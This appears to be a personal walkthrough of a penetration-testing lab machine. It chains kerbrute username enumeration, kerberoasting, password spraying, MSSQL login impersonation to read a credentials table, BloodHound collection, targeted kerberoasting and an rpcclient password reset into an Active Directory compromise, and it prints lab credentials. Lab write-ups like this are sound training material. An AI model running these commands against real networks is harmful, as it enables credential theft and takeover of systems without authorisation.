
# Kerbrute

Using kerbrute for bruteforcing usernames:
```bash
kerbrute userenum --dc 192.168.212.40 -d hokkaido-aerospace.com /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --downgrade
```

We get usernames:![](attachment/5f70acd0ec3e0f5ea47e94be623718a2.png)
Now bruteforcing passwords with the usernames:
![](attachment/892d14bebe8df28e5bb157e7d442070c.png)\

Now we can try kerberoasting with this account:
```bash
GetUserSPNs.py hokkaido-aerospace.com/info:info -request
```
![](attachment/c6b6f7d617322665a13df8e46da11fd2.png)
We get two hashes but they are uncrackable:![](attachment/ba75fa0c62cda02890227e8ecf6f9e64.png)

Now checking SYSVOL share for scripts:
![](attachment/2ae5d9b5494df825d90b29b3a54eb003.png)
![](attachment/69014b0a052e318f497397e0867c1c21.png)
Now we get a password so spraying it:
![](attachment/848e04d85b33bb9b34ab2917fd15d1af.png)
Now using discovery user we can login to Mssql:
```bash
mssqlclient.py -windows-auth -dc-ip 192.168.212.40 hokkaido-aerospace.com/discovery:'Start123!'@192.168.212.40
```
Now checking for impersonation:
```
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```
![](attachment/244d7632d9f665459f905bdba65f705d.png)

Now to impersonate:
```
EXECUTE AS LOGIN = 'hrappdb-reader' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin')
```
Now checking:
```
SELECT SYSTEM_USER
```
![](attachment/665f7d64150e1c79672f50646d82414e.png)
Now checking databases:
```
SELECT name FROM master.dbo.sysdatabases
```
![](attachment/f17153e53b0832857d718d981b897895.png)
Checking all tables:
```
SELECT * FROM hrappdb.INFORMATION_SCHEMA.TABLES;
```
![](attachment/c1c0f18677ff89cdd6765abc75db208a.png)

```
select * from sysauth;
```

![](attachment/f0fbf2c986e1b7b81d0e09c0c317caf3.png)

Now with the creds we can run bloodhound:
```
nxc ldap 192.168.212.40 -u hrapp-service -p 'Untimed$Runny' --bloodhound --collection All -ns 192.168.212.40
```
![](attachment/e3a1b6f73fdbb9a5e8816038f6a9c8d0.png)
Checking outbound transitive object control we have generic write over hazel.
Doing a targeted kerberoast:
```
targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny'
```
![](attachment/bd16e3763c8d2fddfa32c5379974e530.png)
Only hazel's hash gets cracked.
![](attachment/20a92c73113e174b45f4b6b162c83d10.png)

We belong to Tier2-Admins and we have GenericWrite access over Administrators:
![](attachment/ca47130d083b1010f9b37833b4089355.png)
But doesn't work for some reason

```
rpcclient //192.168.94.135 -U hokkaido-aerospace.com/hazel.green%haze1988c
```
```
rpcclient $> setuserinfo2 MOLLY.SMITH 23 'Start123!'
```

